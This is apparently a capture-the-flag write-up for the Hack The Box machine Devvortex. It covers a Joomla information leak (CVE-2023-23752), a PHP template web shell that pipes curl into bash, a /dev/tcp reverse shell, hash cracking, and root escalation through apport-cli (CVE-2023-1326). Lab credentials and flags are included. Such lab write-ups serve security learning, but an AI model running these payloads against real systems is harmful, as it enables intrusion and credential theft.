## IP: `10.10.11.242`
## OS: Linux

Let's ping the target and check if we get a ping back

```bash
ashu@kali ~ ping -c 3 devvortex.htb
PING devvortex (10.10.11.242) 56(84) bytes of data.
64 bytes from devvortex (10.10.11.242): icmp_seq=1 ttl=63 time=67.3 ms
64 bytes from devvortex (10.10.11.242): icmp_seq=2 ttl=63 time=64.6 ms
64 bytes from devvortex (10.10.11.242): icmp_seq=3 ttl=63 time=67.3 ms
--- devvortex ping statistics ---
4 packets transmitted, 3 received, 25% packet loss, time 3005ms
```

The target is **up.**

```bash
ashu@kali ~ sudo nmap -T4 -sV -sC devvortex.htb 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 21:56 IST
Nmap scan report for devvortex (10.10.11.242)
Host is up (0.060s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.29 seconds
```

Scanning the target, we get to see target is a webserver.

Let's enumerate any subdomains.

```bash
ashu@kali ~ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb' -fw 4 -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 97ms]
```

Interesting, So there is a `dev.devvortex.htb` subdomain. Hmm, let's do one more thing and do a directory enumeration.

```bash
ashu@kali ~ dirsearch -u dev.devvortex.htb -i 200
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/ashu/reports/_dev.devvortex.htb/_25-07-25_22-27-28.txt

Target: http://dev.devvortex.htb/

[22:27:28] Starting: 
[22:28:14] 200 -   31B  - /administrator/cache/
[22:28:15] 200 -   31B  - /administrator/logs/
[22:28:15] 200 -   12KB - /administrator/
[22:28:15] 200 -   12KB - /administrator/index.php
[22:28:40] 200 -   31B  - /cache/                                           
[22:28:46] 200 -   31B  - /cli/  
```

Upon running the directory enumeration `/administrator` looks interesting.

Let's lookup

![[Pasted image 20250725223010.png]]

Okay, so there is Joomla Admin page running but we don't have any credentials. Let's check j0omla version.

A Joomla! installation’s version can be remotely extracted without authentication by querying one of a few different endpoints. Joomla! version 4 exposes version information in the /language/en-GB/langmetadata.xml endpoint. Additionally, most, if not all, Joomla! Instances expose their version in the /administrator/manifests/files/joomla.xml endpoint (retrievable without authentication, despite the pathname). We scanned the IP addresses indexed by Shodan and found that Joomla! 4 is not very popular. Only about 14% of responding Joomla! instances used version 4, the only version affected by CVE-2023-23752.

![[Pasted image 20250725223746.png]]

Our Version is `4.2.6` that means it is vulnerable to information disclosure.


I found a POC and I tried it and got user id and password.

![[Pasted image 20250725225638.png]]
"dbtype":"mysqli"
"user":"lewis"
password":"P4ntherg0t1n5r3c0n##"

Let's login to the dashboard

On the initial dashboard we see two users: one is lewis , who is a Superuser, and the other is
logan . We can now edit one of the templates and add PHP code to get a shell on the target.
Upon navigating to` System > Site Templates > Cassiopeia Details and Files` , we are able
to see the current template contents.

![[Pasted image 20250725230112.png]]

We append our malicious PHP code to the end of the `error.php` file in order to get a shell. This
one-liner uses the system() function to run curl and fetch a bash script from our local web
server, which is then piped to bash , triggering a reverse shell.

```php
<?php system("curl 10.10.14.70:8080/rev.sh|bash"); ?>
```

![[Pasted image 20250725231342.png]]

After adding our payload we make sure to save the file.

Finally, we need to host the bash script that will be downloaded and executed on the target.

```bash
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh
```

The above one-liner command will create a bash script named rev.sh in our current working
directory; this is what we will use to initiate the reverse shell connection to our Netcat listener.
We then start a Python web server on our local machine on port 8080 to host the file.

```bash
ashu@kali ~ python -m http.server 8080
[sudo] password for ashu: 
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

We will use the below command to start a `Netcat` listener, which will catch the reverse shell
connection once our script has been executed.

```bash
ashu@kali ~ nc -lnvp 4444                                                      
listening on [any] 4444 ...
```

Finally, we send the request to the `Joomla` instance in order to retrieve our reverse shell from the
local server and execute it. We make sure to target the same file we edited, namely `error.php` .

```bash
curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
```

After running the command we see that `rev.sh` is accessed on our Python web server and we
instantly get a callback on our `Netcat` listener:

```bash
ashu@kali ~ nc -lnvp 4444 
listening on [any] 4444 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.11.242] 35168
sh: 0: can't access tty; job control turned off
$ /bin/bash -i 
bash: cannot set terminal process group (877): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb$ export TERM=xterm
export TERM=xterm
www-data@devvortex:~$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

## Lateral Movement
We start enumerating the system by taking a look at any ports that might be listening locally.

```bash
ss -tlpn
```

We see that ports `3306` and `33060` are listening locally, which are used by MySQL by default.
Looking at the `configuration.php` file in the directory our shell landed in, we are able to see the
database password, which we found earlier.

```bash
cat configuration.php
```

![[Pasted image 20250725232834.png]]

we get a username and a password for database connection

In order to properly interact with MySQL we need to upgrade our current shell. We can use the
script command to create a new PTY using bash .

```bash
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@devvortex:~/dev.devvortex.htb$
```

We now use the obtained credentials to connect to the local database. This is successful, and we can start enumerating the database. First, let's list any existing databases.

```bash
mysql -u lewis -p
```

```bash
www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p
mysql -u lewis -p
Enter password: P4ntherg0t1n5r3c0n##

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 6359
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 

```

![[Pasted image 20250725235849.png]]

There's a handful of tables, but as we are looking for credentials, our attention is drawn to the
`sd4fg_users` table, which we proceed to dump.

```sql
select * from sd4fg_users;
```

Here, we see the password hash for the user logan . We feed the hash to `hashid` (or a similar
hash identification tool) and find that it is a `bcrypt` hash.

```bash
hashid '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
```

Armed with this knowledge, we use `hashcat` with mode `3200` to crack the hash.

```bash
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```



```bash
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13980HX, 4908/9881 MB (2048 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy...tkIj12
Time.Started.....: Sat Jul 26 00:03:26 2025 (9 secs)
Time.Estimated...: Sat Jul 26 00:03:35 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      158 H/s (6.70ms) @ Accel:12 Loops:8 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1440/14344385 (0.01%)
Rejected.........: 0/1440 (0.00%)
Restore.Point....: 1296/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
Candidate.Engine.: Device Generator
Candidates.#1....: winston -> michel
Hardware.Mon.#1..: Util: 85%

Started: Sat Jul 26 00:03:03 2025
Stopped: Sat Jul 26 00:03:36 2025
```

The hash is cracked successfully and we obtain the password `tequieromucho` . Armed with the
password, we can now authenticate as `logan` via SSH.

```bash
ssh logan@devvortex.htb        
The authenticity of host 'devvortex.htb (10.10.11.242)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'devvortex.htb' (ED25519) to the list of known hosts.
logan@devvortex.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 25 Jul 2025 06:11:12 PM UTC

  System load:  0.0               Processes:             168
  Usage of /:   63.9% of 4.76GB   Users logged in:       0
  Memory usage: 16%               IPv4 address for eth0: 10.10.11.242
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 26 14:44:38 2024 from 10.10.14.23
logan@devvortex:~$ 

```

Let's get the flags.

```bash
logan@devvortex:~$ cat user.txt 
0243d8d90a40f5714e060029c807de50
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli

```



So, the apport-cli is allowed to run with sudo priviledges. let's check if it's a vulnerable version or not.

We see that version `2.20.11` is installed, which, according to this commit, is vulnerable to a
privilege escalation attack if an unprivileged user is allowed to run it with `sudo` . The vulnerability
was assigned CVE-2023-1326.
The exploit stems from the fact that `apport-cli `invokes a pager (such as `less` ) when viewing a
crash, which can be used to run system commands in the context of the user executing the parent
command. In this case, if ran with as `root` using `sudo` , it can be used to spawn an interactive
system shell, as the elevated privileges are not dropped.

With that in mind, we need to somehow trigger the pager, so we start by listing all the running
processes and can then attempt to report a problem using `apport-cli `in` --file-bug` mode.

```
logan@devvortex:~$ ps -ux                                                                                                                                                                   
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                                                  
logan       1852  0.0  0.2  19040  9624 ?        Ss   18:11   0:00 /lib/systemd/systemd --user                                                                                              
logan       1853  0.0  0.0 169072  3172 ?        S    18:11   0:00 (sd-pam)                                                                                                                 
logan       1961  0.0  0.1  14060  5848 ?        S    18:11   0:00 sshd: logan@pts/1                                                                                                        
logan       1962  0.0  0.1   8272  5384 pts/1    Ss   18:11   0:00 -bash                                                                                                                    
logan       1994  0.0  0.0   9080  3548 pts/1    R+   18:16   0:00 ps -ux                                                                                                                   
logan@devvortex:~$ sudo /usr/bin/apport-cli -f -P 1962 
```

We will use the process ID ( `PID` ) of systemd , namely `4576`.
We now run `apport-cl`i using `sudo` , specifying the PID using the `-P` flag and `file-bug` mode
using the `-f` flag. The tool will then gather information and report any issues with that process,
prompting us to pick what to do with the report. We proceed to select` view report` , and since
less is configured as the default pager, we can run the` !/bin/bash `command and spawn an
interactive system shell as `root` .

```bash
sudo /usr/bin/apport-cli -f -P 1962
!/bin/bash
```

The final flag can be obtained at `/root/root.txt`